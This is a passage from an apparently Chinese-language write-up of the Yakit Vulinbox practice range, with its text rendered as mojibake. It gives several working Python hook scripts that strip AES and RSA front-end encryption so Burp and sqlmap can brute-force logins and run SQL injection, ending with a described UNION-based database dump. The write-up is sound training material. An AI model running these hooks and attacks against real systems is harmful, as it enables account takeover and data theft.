hook_response_to_client(response: ResponseModel): return response if __name__ == \u0026#34;__main__\u0026#34;: import uvicorn uvicorn.run(app, host=\u0026#34;0.0.0.0\u0026#34;, port=8003) æŠ“åŒ…éªŒè¯ï¼š è‡ªåŠ¨åŠ è§£å¯†æˆåŠŸï¼Œå¼€å§‹çˆ†ç ´ï¼š çˆ†ç ´æˆåŠŸï¼šadmin/admin\nAES-ECBå‰ç«¯åŠ å¯† å’Œä¸Šé¢çš„ç±»ä¼¼ï¼Œä¸ç‚¹åœ¨äºECBæ¨¡å¼ä¸éœ€è¦ivï¼Œè¿™é‡Œå°±ä¸åˆ†æäº†ï¼Œhttp hookå¦‚ä¸‹ï¼š\nimport json import base64 from fastapi import FastAPI from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad from _base_classes import * SECRET_KEY = b\u0026#34;1234123412341234\u0026#34; # 16å­—èŠ‚ key KEY_HEX = SECRET_KEY.hex() app = FastAPI() @app.post(\u0026#34;/hookRequestToBurp\u0026#34;, response_model=RequestModel) async def hook_request_to_burp(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;å®¢æˆ·ç«¯ -\u0026gt; Burpï¼šè§£å¯†\u0026#34;\u0026#34;\u0026#34; encrypted_json = json.loads(request.content) data_b64 = encrypted_json[\u0026#34;data\u0026#34;] cipher = AES.new(SECRET_KEY, AES.MODE_ECB) decrypted = unpad(cipher.decrypt(base64.b64decode(data_b64)), AES.block_size) request.content = decrypted return request @app.post(\u0026#34;/hookRequestToServer\u0026#34;, response_model=RequestModel) async def hook_request_to_server(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;Burp -\u0026gt; Serverï¼šåŠ å¯†\u0026#34;\u0026#34;\u0026#34; raw_json = request.content # åŸå§‹ JSONï¼ˆå­—èŠ‚ï¼‰ cipher = AES.new(SECRET_KEY, AES.MODE_ECB) ciphertext = cipher.encrypt(pad(raw_json, AES.block_size)) encrypted_json = { \u0026#34;data\u0026#34;: base64.b64encode(ciphertext).decode(), \u0026#34;key\u0026#34;: KEY_HEX } request.content = json.dumps(encrypted_json).encode() return request @app.post(\u0026#34;/hookResponseToBurp\u0026#34;, response_model=ResponseModel) async def hook_response_to_burp(response: ResponseModel): return response @app.post(\u0026#34;/hookResponseToClient\u0026#34;, response_model=ResponseModel) async def hook_response_to_client(response: ResponseModel): return response if __name__ == \u0026#34;__main__\u0026#34;: import uvicorn uvicorn.run(app, host=\u0026#34;0.0.0.0\u0026#34;, port=8003) è‡ªåŠ¨åŠ è§£å¯†æˆåŠŸï¼š\nçˆ†ç ´æˆåŠŸï¼š\nAES-ECB SQLæ³¨å…¥ ä¹ä¸€çœ‹å’Œä¸Šä¸€ä¸ªæ²¡åŒºåˆ«ï¼Œä½†æ˜¯è¯´æ˜¯æ‰“SQLæ³¨å…¥ï¼Œæ‰‹æµ‹ä¸€ä¸‹å‘ç°usernameå¯ä»¥æ³¨å…¥ï¼š hookä¸ç”¨æ”¹ç›´æ¥ç”¨galaxyçš„send decrypted request to sqlmapï¼š\nsqlmapè·‘ä¸€ä¸‹ï¼ˆå› ä¸ºsqlçš„ä»£ç†èµ°çš„burpï¼Œæ‰€ä»¥ï¼‰ï¼š\nï¼ˆè¿™é‡Œä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œåœ¨æœ¬åœ°æ­å»ºçš„é¶åœºä½¿ç”¨sqlmapçš„æ—¶å€™ï¼Œå‘ç°å¯¹æœ¬åœ°IPçš„httpæµé‡åˆ°ä¸äº†burpï¼Œäºæ˜¯ä½¿ç”¨çš„vulinboxåœ¨çº¿é¶åœºç»§ç»­å®éªŒï¼‰\nç¡®å®èƒ½æ‰“ï¼Œè¿™é‡Œå°±ä¸è¿›ä¸€æ­¥æ³¨å…¥äº†\nAES-ECB SQLæ³¨å…¥+bypassè®¤è¯ å‰ç«¯æ²¡å˜ï¼Œåªæ˜¯åœ¨å¯†ç å¤„å¢åŠ äº†æ³¨å…¥ç‚¹ï¼Œä¾ç„¶ç”¨å‰é¢çš„http hookå³å¯ï¼š\nAES-ECBè¡¨å•åŠ å¯† è¿™æ¬¡çš„åŠ å¯†æäº¤çš„è¡¨å•ï¼š ä»å‰ç«¯ä»£ç ä¸Šçœ‹ï¼Œä¸åŒç‚¹æ˜¯åŠ å¯†åçš„jsonæœ‰äº†ä¸ªivï¼ŒæœªåŠ å¯†çš„jsonä¸­å¤šäº†ä¸€é¡¹ageï¼š ä½†æ˜¯ä»å¯†ç å­¦è§’åº¦ä¸Šåˆ†æï¼Œivåœ¨è¿™é‡Œæ˜¯æ²¡æœ‰ä½œç”¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¾ç„¶å¯ä»¥ç›´æ¥ç”¨å‰é¢çš„http hookè‡ªåŠ¨åŠ è§£å¯†ï¼š\nRSAè¡¨å•åŠ å¯† è¿™ä¸€å…³ç”¨çš„æ˜¯RSAåŠ å¯†ï¼Œjsonä¸­ç»™å‡ºäº†dataã€å…¬ç§é’¥åŠå…¶base64ï¼ˆè¿™å‡ å…³æœ¬åœ°é¶åœºçš„å‰ç«¯èµ„æºåŠ è½½æœ‰é—®é¢˜ï¼Œç”¨çš„åœ¨çº¿é¶åœºï¼Œåé¢å‘ç°æ›´æ–°ä¸€ä¸‹é¶åœºå°±å¥½äº†ï¼‰\nåŠ å¯†åè¡¨å•çš„jsonä¸€å¤§å¨å“ˆå“ˆå“ˆå“ˆï¼š jsæ‰¾åˆ°åŠ è§£å¯†ä»£ç ï¼š åˆ†æå¯çŸ¥ï¼š\nRSA-OAEPåŠ å¯† å¡«å……æ–¹æ¡ˆçš„å“ˆå¸Œå‡½æ•°æ˜¯sha256ï¼ˆä¸€èˆ¬é»˜è®¤æ˜¯sha1ï¼‰ æ ¹æ®åˆ†æçš„ç»“æœä»¥åŠjsonç»“æ„ç¼–å†™http hookï¼š\nimport json import base64 import typing as t from fastapi import FastAPI from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP from Crypto.Hash import SHA256 from _base_classes import * app = FastAPI() JSON_KEY = \u0026#34;data\u0026#34; app.state.pubkey = None app.state.prikey = None @app.post(\u0026#34;/hookRequestToBurp\u0026#34;, response_model=RequestModel) async def hook_request_to_burp(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;å®¢æˆ·ç«¯ -\u0026gt; Burpï¼šè§£å¯†\u0026#34;\u0026#34;\u0026#34; encrypted_json: t.Dict = json.loads(request.content) encrypted_data: bytes = get_data(request.content) prikey_b64 = encrypted_json[\u0026#34;privateKeyBase64\u0026#34;] pubkey_b64 = encrypted_json[\u0026#34;publicKeyBase64\u0026#34;] pubkey = base64.b64decode(pubkey_b64) prikey = base64.b64decode(prikey_b64) app.state.pubkey = pubkey app.state.prikey = prikey prikey = base64.b64decode(prikey_b64) decrypted : bytes = decrypt(encrypted_data, prikey) request.content = decrypted return request @app.post(\u0026#34;/hookRequestToServer\u0026#34;, response_model=RequestModel) async def hook_request_to_server(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;Burp -\u0026gt; Serverï¼šåŠ å¯†\u0026#34;\u0026#34;\u0026#34; data: bytes = request.content public_key = app.state.pubkey encryptedData: bytes = encrypt(data, public_key) # å°†å·²åŠ å¯†çš„æ•°æ®è½¬æ¢ä¸ºServerå¯è¯†åˆ«çš„æ ¼å¼ body: bytes = to_data(encryptedData) # æ›´æ–°body request.content = body return request @app.post(\u0026#34;/hookResponseToBurp\u0026#34;, response_model=ResponseModel) async def hook_response_to_burp(response: ResponseModel): return response @app.post(\u0026#34;/hookResponseToClient\u0026#34;, response_model=ResponseModel) async def hook_response_to_client(response: ResponseModel): return response def decrypt(content: bytes, secret: bytes) -\u0026gt; bytes: rsa_key = RSA.import_key(secret) cipher = PKCS1_OAEP.new(rsa_key, hashAlgo=SHA256) decrypted_data = cipher.decrypt(content) assert isinstance(decrypted_data, bytes) return decrypted_data def encrypt(content: bytes, secret: bytes) -\u0026gt; bytes: rsa_key = RSA.import_key(secret) cipher = PKCS1_OAEP.new(rsa_key, hashAlgo=SHA256) return cipher.encrypt(content) def get_data(content: bytes) -\u0026gt; bytes: body_json: t.Dict = json.loads(content) return base64.b64decode(body_json[JSON_KEY]) def to_data(content: bytes) -\u0026gt; bytes: pubkey = app.state.pubkey prikey = app.state.prikey pubkey_str = pubkey.decode() prikey_str = prikey.decode() pubkey_b64 = base64.b64encode(pubkey).decode() prikey_b64 = base64.b64encode(prikey).decode() body_json = { \u0026#34;data\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;publicKey\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;publicKeyBase64\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;privateKey\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;privateKeyBase64\u0026#34;: \u0026#34;\u0026#34; } body_json[JSON_KEY] = base64.b64encode(content).decode() body_json[\u0026#34;publicKey\u0026#34;] = pubkey_str body_json[\u0026#34;publicKeyBase64\u0026#34;] = pubkey_b64 body_json[\u0026#34;privateKey\u0026#34;] = prikey_str body_json[\u0026#34;privateKeyBase64\u0026#34;] = prikey_b64 return json.dumps(body_json).encode() if __name__ == \u0026#34;__main__\u0026#34;: import uvicorn uvicorn.run(app, host=\u0026#34;0.0.0.0\u0026#34;, port=8003) æˆåŠŸå®ç°è‡ªåŠ¨åŠ è§£å¯†ï¼š RSAè¡¨å•åŠ å¯†ï¼ˆè¿œç¨‹åŠ¨æ€è·å–å¯†é’¥ï¼‰ å¯ä»¥çœ‹åˆ°åŠ å¯†åçš„æ•°æ®æ˜¯æ²¡æœ‰å¯†é’¥çš„ï¼š\nåˆ†æjså¯çŸ¥å…¬é’¥æ˜¯ä»æœåŠ¡ç«¯åŠ¨æ€è·å–çš„ï¼š\nçœ‹ä¸€ä¸‹è·å–æ—¶çš„è¿”å›ï¼š æ—¢ç„¶è¿™ä¸ªæ¥å£å…¬ç§é’¥éƒ½èƒ½è·å–ï¼Œé‚£ä¹ˆå°±åœ¨ä¸Šä¸€ä¸ªhookçš„åŸºç¡€ä¸Šåšæ›´æ”¹ï¼ˆç”±äºåœ¨çº¿é¶åœºçš„å¯†é’¥æ¥å£æœ‰ç‚¹å»¶è¿Ÿï¼Œæ‰€ä»¥æˆ‘æŠŠtimeoutè°ƒæˆ30äº†ï¼Œæ­£å¸¸æ¥è¯´ä¸ç”¨è¿™ä¹ˆé•¿ï¼‰ï¼š\nimport json import base64 import typing as t import requests from fastapi import FastAPI from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP from Crypto.Hash import SHA256 from _base_classes import * app = FastAPI() JSON_KEY = \u0026#34;data\u0026#34; app.state.pubkey = None app.state.prikey = None @app.post(\u0026#34;/hookRequestToBurp\u0026#34;, response_model=RequestModel) async def hook_request_to_burp(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;å®¢æˆ·ç«¯ -\u0026gt; Burpï¼šè§£å¯†\u0026#34;\u0026#34;\u0026#34; fetch_rsa_keys() encrypted_data: bytes = get_data(request.content) prikey = app.state.prikey decrypted : bytes = decrypt(encrypted_data, prikey) request.content = decrypted return request @app.post(\u0026#34;/hookRequestToServer\u0026#34;, response_model=RequestModel) async def hook_request_to_server(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;Burp -\u0026gt; Serverï¼šåŠ å¯†\u0026#34;\u0026#34;\u0026#34; fetch_rsa_keys() data: bytes = request.content public_key = app.state.pubkey encryptedData: bytes = encrypt(data, public_key) # å°†å·²åŠ å¯†çš„æ•°æ®è½¬æ¢ä¸ºServerå¯è¯†åˆ«çš„æ ¼å¼ body: bytes = to_data(encryptedData) # æ›´æ–°body request.content = body return request @app.post(\u0026#34;/hookResponseToBurp\u0026#34;, response_model=ResponseModel) async def hook_response_to_burp(response: ResponseModel): return response @app.post(\u0026#34;/hookResponseToClient\u0026#34;, response_model=ResponseModel) async def hook_response_to_client(response: ResponseModel): return response def decrypt(content: bytes, secret: bytes) -\u0026gt; bytes: rsa_key = RSA.import_key(secret) cipher = PKCS1_OAEP.new(rsa_key, hashAlgo=SHA256) decrypted_data = cipher.decrypt(content) assert isinstance(decrypted_data, bytes) return decrypted_data def encrypt(content: bytes, secret: bytes) -\u0026gt; bytes: rsa_key = RSA.import_key(secret) cipher = PKCS1_OAEP.new(rsa_key, hashAlgo=SHA256) return cipher.encrypt(content) def get_data(content: bytes) -\u0026gt; bytes: body_json: t.Dict = json.loads(content) return base64.b64decode(body_json[JSON_KEY]) def to_data(contnet: bytes) -\u0026gt; bytes: body_json = { \u0026#34;data\u0026#34;: \u0026#34;\u0026#34; } body_json[JSON_KEY] = base64.b64encode(contnet).decode() return json.dumps(body_json).encode() def fetch_rsa_keys() -\u0026gt; t.Tuple[bytes, bytes]: url = \u0026#34;http://127.0.0.1:8787/crypto/js/rsa/generator\u0026#34; try: response = requests.get(url, timeout=30) response.raise_for_status() data = response.json() app.state.pubkey = data[\u0026#34;publicKey\u0026#34;].encode() app.state.prikey = data[\u0026#34;privateKey\u0026#34;].encode() except Exception as e: raise RuntimeError(f\u0026#34;æ— æ³•è·å–RSAå¯†é’¥: {e}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: import uvicorn uvicorn.run(app, host=\u0026#34;0.0.0.0\u0026#34;, port=8003) æˆåŠŸè‡ªåŠ¨åŠ è§£å¯†ï¼š RSAè¡¨å•åŠ å¯†+å“åº”åŠ å¯†ï¼ˆè¿œç¨‹åŠ¨æ€è·å–å¯†é’¥ï¼‰ å’Œä¸Šä¸€å…³ä¸åŒçš„æ˜¯å“åº”ä¹ŸåŠ å¯†äº†ï¼š å“åº”ï¼ˆè¿™é‡Œé¶åœºè¿˜å¾ˆè´´å¿ƒçš„ç»™å‡ºäº†dataè§£å¯†åçš„originä½œä¸ºå‚è€ƒï¼‰ï¼š è§£å¯†å‡½æ•°ï¼š æ ¹æ®è§£å¯†é€»è¾‘ç»§ç»­ä¿®æ”¹ä¸Šé¢çš„hookï¼š\nimport json import base64 import typing as t import requests from fastapi import FastAPI from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP from Crypto.Hash import SHA256 from _base_classes import * app = FastAPI() JSON_KEY = \u0026#34;data\u0026#34; app.state.pubkey = None app.state.prikey = None @app.post(\u0026#34;/hookRequestToBurp\u0026#34;, response_model=RequestModel) async def hook_request_to_burp(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;å®¢æˆ·ç«¯ -\u0026gt; Burpï¼šè§£å¯†\u0026#34;\u0026#34;\u0026#34; fetch_rsa_keys() encrypted_data: bytes = get_data(request.content) prikey = app.state.prikey decrypted : bytes = decrypt(encrypted_data, prikey) request.content = decrypted return request @app.post(\u0026#34;/hookRequestToServer\u0026#34;, response_model=RequestModel) async def hook_request_to_server(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;Burp -\u0026gt; Serverï¼šåŠ å¯†\u0026#34;\u0026#34;\u0026#34; fetch_rsa_keys() data: bytes = request.content public_key = app.state.pubkey encryptedData: bytes = encrypt(data, public_key) # å°†å·²åŠ å¯†çš„æ•°æ®è½¬æ¢ä¸ºServerå¯è¯†åˆ«çš„æ ¼å¼ body: bytes = to_data(encryptedData) # æ›´æ–°body request.content = body return request @app.post(\u0026#34;/hookResponseToBurp\u0026#34;, response_model=ResponseModel) async def hook_response_to_burp(response: ResponseModel): fetch_rsa_keys() encrypted_data: bytes = get_data(response.content) prikey = app.state.prikey decrypted : bytes = decrypt(encrypted_data, prikey) response.content = decrypted return response @app.post(\u0026#34;/hookResponseToClient\u0026#34;, response_model=ResponseModel) async def hook_response_to_client(response: ResponseModel): return response def decrypt(content: bytes, secret: bytes) -\u0026gt; bytes: rsa_key = RSA.import_key(secret) cipher = PKCS1_OAEP.new(rsa_key, hashAlgo=SHA256) decrypted_data = cipher.decrypt(content) assert isinstance(decrypted_data, bytes) return decrypted_data def encrypt(content: bytes, secret: bytes) -\u0026gt; bytes: rsa_key = RSA.import_key(secret) cipher = PKCS1_OAEP.new(rsa_key, hashAlgo=SHA256) return cipher.encrypt(content) def get_data(content: bytes) -\u0026gt; bytes: body_json: t.Dict = json.loads(content) return base64.b64decode(body_json[JSON_KEY]) def to_data(content: bytes) -\u0026gt; bytes: body_json = { \u0026#34;data\u0026#34;: \u0026#34;\u0026#34; } body_json[JSON_KEY] = base64.b64encode(content).decode() return json.dumps(body_json).encode() def fetch_rsa_keys() -\u0026gt; t.Tuple[bytes, bytes]: url = \u0026#34;http://127.0.0.1:8787/crypto/js/rsa/generator\u0026#34; try: response = requests.get(url, timeout=30) response.raise_for_status() data = response.json() app.state.pubkey = data[\u0026#34;publicKey\u0026#34;].encode() app.state.prikey = data[\u0026#34;privateKey\u0026#34;].encode() except Exception as e: raise RuntimeError(f\u0026#34;æ— æ³•è·å–RSAå¯†é’¥: {e}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: import uvicorn uvicorn.run(app, host=\u0026#34;0.0.0.0\u0026#34;, port=8003) æˆåŠŸè‡ªåŠ¨åŠ è§£å¯†è¯·æ±‚å’Œå“åº”ï¼š RSAåŠ å¯†AESå¯†é’¥ï¼ŒæœåŠ¡å™¨ä¼ è¾“ ç”±äºRSAåŠ è§£å¯†æœ‰é•¿åº¦é™åˆ¶ï¼Œä»¥åŠè§£å¯†é€Ÿåº¦ç­‰é—®é¢˜ï¼Œæ‰€ä»¥å¦‚httpsç­‰åè®®éƒ½æ˜¯ç”¨éå¯¹ç§°åŠ å¯†å¯¹ç§°åŠ å¯†çš„å¯†é’¥ï¼Œç„¶åç”¨å¯¹ç§°åŠ å¯†ç®—æ³•æ¥åŠ å¯†æ•°æ®\nå¯ä»¥çœ‹åˆ°åŠ å¯†çš„jsonåˆä¸ä¸€æ ·äº†ï¼š åˆ†æä¸€ä¸‹jsï¼ŒRSAçš„keyä¾æ—§æ˜¯è¿œç¨‹åŠ¨æ€è·å–çš„ï¼š\nåŠ è§£å¯†æµç¨‹ï¼š\nå¯ä»¥åˆ¤æ–­è¯·æ±‚å†…å®¹å’Œå“åº”æ˜¯AES-GCMåŠ å¯†(è¿™é‡Œtagç›´æ¥æ‹¼æ¥åœ¨dataæœ«å°¾)ï¼Œéšæœºç”Ÿæˆçš„keyå’Œivåˆè¢«RSAåŠ å¯†äº†ï¼Œå†™ä¸ªhookï¼š\nimport json import base64 import typing as t import requests from fastapi import FastAPI from Crypto.Cipher import AES from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_OAEP from Crypto.Hash import SHA256 from _base_classes import * app = FastAPI() JSON_KEY = \u0026#34;data\u0026#34; app.state.pubkey = None app.state.prikey = None app.state.iv = None app.state.key = None @app.post(\u0026#34;/hookRequestToBurp\u0026#34;, response_model=RequestModel) async def hook_request_to_burp(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;å®¢æˆ·ç«¯ -\u0026gt; Burpï¼šè§£å¯†\u0026#34;\u0026#34;\u0026#34; fetch_rsa_keys() encrypted_iv: bytes = get_iv(request.content) encrypted_key: bytes = get_key(request.content) encrypted_data: bytes = get_data(request.content) prikey = app.state.prikey iv : bytes = rsa_decrypt(encrypted_iv, prikey) key : bytes = rsa_decrypt(encrypted_key, prikey) decrypted: bytes = aes_decrypt(encrypted_data, key, iv) set_iv_keys(iv, key) request.content = decrypted return request @app.post(\u0026#34;/hookRequestToServer\u0026#34;, response_model=RequestModel) async def hook_request_to_server(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;Burp -\u0026gt; Serverï¼šåŠ å¯†\u0026#34;\u0026#34;\u0026#34; fetch_rsa_keys() data: bytes = request.content key = app.state.key iv = app.state.iv encryptedData: bytes = aes_encrypt(data, key, iv) body: bytes = to_data(encryptedData) # æ›´æ–°body request.content = body return request @app.post(\u0026#34;/hookResponseToBurp\u0026#34;, response_model=ResponseModel) async def hook_response_to_burp(response: ResponseModel): fetch_rsa_keys() encrypted_iv: bytes = get_iv(response.content) encrypted_key: bytes = get_key(response.content) encrypted_data: bytes = get_data(response.content) set_iv_keys(encrypted_iv, encrypted_key) prikey = app.state.prikey iv : bytes = rsa_decrypt(encrypted_iv, prikey) key : bytes = rsa_decrypt(encrypted_key, prikey) decrypted: bytes = aes_decrypt(encrypted_data, key, iv) response.content = decrypted return response @app.post(\u0026#34;/hookResponseToClient\u0026#34;, response_model=ResponseModel) async def hook_response_to_client(response: ResponseModel): return response def rsa_decrypt(content: bytes, secret: bytes) -\u0026gt; bytes: rsa_key = RSA.import_key(secret) cipher = PKCS1_OAEP.new(rsa_key, hashAlgo=SHA256) decrypted_data = cipher.decrypt(content) assert isinstance(decrypted_data, bytes) return decrypted_data def aes_decrypt(ciphertext_with_tag: bytes, key: bytes, iv: bytes) -\u0026gt; bytes: cipher = AES.new(key, AES.MODE_GCM, nonce=iv) plaintext = cipher.decrypt_and_verify(ciphertext_with_tag[:-16], ciphertext_with_tag[-16:]) return plaintext def rsa_encrypt(content: bytes, public_key: bytes) -\u0026gt; bytes: rsa_key = RSA.import_key(public_key) cipher = PKCS1_OAEP.new(rsa_key, hashAlgo=SHA256) encrypted_data = cipher.encrypt(content) return encrypted_data def aes_encrypt(plaintext: bytes, key: bytes, iv: bytes) -\u0026gt; bytes: cipher = AES.new(key, AES.MODE_GCM, nonce=iv) ciphertext, tag = cipher.encrypt_and_digest(plaintext) return ciphertext + tag def get_data(content: bytes) -\u0026gt; bytes: body_json: t.Dict = json.loads(content) return base64.b64decode(body_json[JSON_KEY]) def get_iv(content: bytes) -\u0026gt; bytes: body_json: t.Dict = json.loads(content) return base64.b64decode(body_json[\u0026#34;encryptedIV\u0026#34;]) def get_key(content: bytes) -\u0026gt; bytes: body_json: t.Dict = json.loads(content) return base64.b64decode(body_json[\u0026#34;encryptedKey\u0026#34;]) def to_data(content: bytes) -\u0026gt; bytes: pubkey = app.state.pubkey iv = app.state.iv key = app.state.key encrypt_key = rsa_encrypt(key, pubkey) encrypt_iv = rsa_encrypt(iv, pubkey) body_json = { \u0026#34;data\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;iv\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;encryptedIV\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;encryptedKey\u0026#34;: \u0026#34;\u0026#34; } body_json[JSON_KEY] = base64.b64encode(content).decode() body_json[\u0026#34;iv\u0026#34;] = iv.decode() body_json[\u0026#34;encryptedIV\u0026#34;] = base64.b64encode(encrypt_iv).decode(\u0026#39;utf-8\u0026#39;) body_json[\u0026#34;encryptedKey\u0026#34;] = base64.b64encode(encrypt_key).decode(\u0026#39;utf-8\u0026#39;) return json.dumps(body_json).encode() def fetch_rsa_keys() -\u0026gt; t.Tuple[bytes, bytes]: url = \u0026#34;http://127.0.0.1:8787/crypto/js/rsa/generator\u0026#34; try: response = requests.get(url, timeout=30) response.raise_for_status() data = response.json() app.state.pubkey = data[\u0026#34;publicKey\u0026#34;].encode() app.state.prikey = data[\u0026#34;privateKey\u0026#34;].encode() except Exception as e: raise RuntimeError(f\u0026#34;æ— æ³•è·å–RSAå¯†é’¥: {e}\u0026#34;) def set_iv_keys(iv: bytes, key: bytes) -\u0026gt; t.Tuple[bytes, bytes]: app.state.iv = iv app.state.key = key if __name__ == \u0026#34;__main__\u0026#34;: import uvicorn uvicorn.run(app, host=\u0026#34;0.0.0.0\u0026#34;, port=8003) æˆåŠŸè‡ªåŠ¨åŠ è§£å¯†ï¼š SQL æ³¨å…¥(ä»ç™»é™†åˆ° Dump æ•°æ®åº“) æœ€åä¸€å…³ï¼Œè¿™æ˜¯ä¸€ä¸ªç™»å½•åœºæ™¯ï¼š æŠ“ä¸ªåŒ…çœ‹çœ‹åŠ å¯†ï¼š ç›®æµ‹æ˜¯è¯·æ±‚å’Œå“åº”éƒ½åšäº†aesåŠ å¯†ï¼Œåˆ†æjså¯çŸ¥æ˜¯CBCæ¨¡å¼ï¼š\né‚£ä¹ˆå¾ˆç®€å•äº†ï¼Œå†™ä¸ªhookï¼š\n# ç¬¬åäºŒå…³ import json import base64 import typing as t import os from fastapi import FastAPI from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad from _base_classes import * app = FastAPI() app.state.key = None app.state.key_hex = None @app.post(\u0026#34;/hookRequestToBurp\u0026#34;, response_model=RequestModel) async def hook_request_to_burp(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;å®¢æˆ·ç«¯ -\u0026gt; Burpï¼šè§£å¯†\u0026#34;\u0026#34;\u0026#34; # è§£æåŠ å¯† JSON encrypted_json = json.loads(request.content) key_hex = encrypted_json[\u0026#34;key\u0026#34;] key = bytes.fromhex(key_hex) app.state.key = key app.state.key_hex = key_hex iv_hex = encrypted_json[\u0026#34;iv\u0026#34;] data_b64 = encrypted_json[\u0026#34;message\u0026#34;] # è§£å¯†å†…å®¹ iv = bytes.fromhex(iv_hex) cipher = AES.new(key, AES.MODE_CBC, iv) decrypted = unpad(cipher.decrypt(base64.b64decode(data_b64)), AES.block_size) request.content = decrypted return request @app.post(\u0026#34;/hookRequestToServer\u0026#34;, response_model=RequestModel) async def hook_request_to_server(request: RequestModel): \u0026#34;\u0026#34;\u0026#34;Burp -\u0026gt; Serverï¼šåŠ å¯†\u0026#34;\u0026#34;\u0026#34; raw_json = request.content # æ˜æ–‡ JSONï¼ˆå­—èŠ‚ï¼‰ iv = os.urandom(16) key = app.state.key key_hex = app.state.key_hex cipher = AES.new(key, AES.MODE_CBC, iv) ciphertext = cipher.encrypt(pad(raw_json, AES.block_size)) encrypted_json = { \u0026#34;key\u0026#34;: key_hex, \u0026#34;iv\u0026#34;: iv.hex(), \u0026#34;message\u0026#34;: base64.b64encode(ciphertext).decode(), } request.content = json.dumps(encrypted_json).encode() return request @app.post(\u0026#34;/hookResponseToBurp\u0026#34;, response_model=ResponseModel) async def hook_response_to_burp(response: ResponseModel): encrypted_json = json.loads(response.content) key_hex = encrypted_json[\u0026#34;key\u0026#34;] key = bytes.fromhex(key_hex) app.state.key = key app.state.key_hex = key_hex iv_hex = encrypted_json[\u0026#34;iv\u0026#34;] data_b64 = encrypted_json[\u0026#34;message\u0026#34;] # è§£å¯†å†…å®¹ iv = bytes.fromhex(iv_hex) cipher = AES.new(key, AES.MODE_CBC, iv) decrypted = unpad(cipher.decrypt(base64.b64decode(data_b64)), AES.block_size) response.content = decrypted return response @app.post(\u0026#34;/hookResponseToClient\u0026#34;, response_model=ResponseModel) async def hook_response_to_client(response: ResponseModel): return response if __name__ == \u0026#34;__main__\u0026#34;: import uvicorn uvicorn.run(app, host=\u0026#34;0.0.0.0\u0026#34;, port=8003) æˆåŠŸè‡ªåŠ¨åŠ è§£å¯†ï¼š\nç”±äºé¢˜ç›®è¯´æ˜¯æ³¨å…¥ï¼Œæ‰€ä»¥è¯•è¯•ä¸‡èƒ½å¯†ç ï¼š\nç›´æ¥ç™»å½•æˆåŠŸè¿”å›tokenäº†ï¼Œè¿›å»çœ‹çœ‹ï¼š\nå‘ç°æœ‰ä¸€ä¸ªæŸ¥è¯¢åŠŸèƒ½ï¼Œå¹¶ä¸”hookè‡ªåŠ¨è§£å¯†äº†ä¸€ä¸ªæŸ¥è¯¢çš„è¯·æ±‚åŒ…ï¼š\næ—¢ç„¶æ˜¯æŸ¥è¯¢ï¼Œé‚£ä¹ˆè¿™é‡Œå¾ˆå®¹æ˜“æƒ³åˆ°èƒ½å¦æ³¨å…¥ï¼Œsqlä»£ç†åˆ°burpä¸€æŠŠæ¢­ï¼ˆåŒæ ·å› ä¸ºæœ¬åœ°é¶åœºsqlmapä»£ç†ä¸äº†ï¼Œè·‘çš„åœ¨çº¿é¶åœºğŸ˜“ï¼‰ï¼š\nå‘ç°å­˜åœ¨SQLiteæ³¨å…¥ï¼Œä½†æ˜¯ç”±äºåœ¨çº¿é¶åœºæ¯”è¾ƒè„†å¼±ç»å¸¸502ï¼Œè¿™é‡Œå°±ä¸dumpæ•°æ®åº“äº†ğŸ˜\nä¸è¿‡è¯åˆè¯´å›æ¥ï¼Œæ—¢ç„¶åŠ è§£å¯†éƒ½å®ç°äº†ï¼Œé‚£å°±æ‰‹æ³¨è¯•è¯•ï¼Œè¿™é‡Œç”¨çš„æ˜¯è”åˆæŸ¥è¯¢æ³¨å…¥ï¼š\norder byå‘ç°æ˜¯3åˆ—ï¼š\nè”åˆæŸ¥è¯¢æŸ¥çœ‹å›æ˜¾ä½ï¼š\nè¯»å–æ•°æ®åº“ç»“æ„ä¿¡æ¯ï¼š è¯»å–vulin_usersè¡¨ï¼š æŸ¥è¯¢è¡¨ä¸­æ•°æ®ï¼š è‡³æ­¤æˆ‘ä»¬é€šå…³äº†æ•´ä¸ªyakitçš„vulinboxé¶åœº\n",
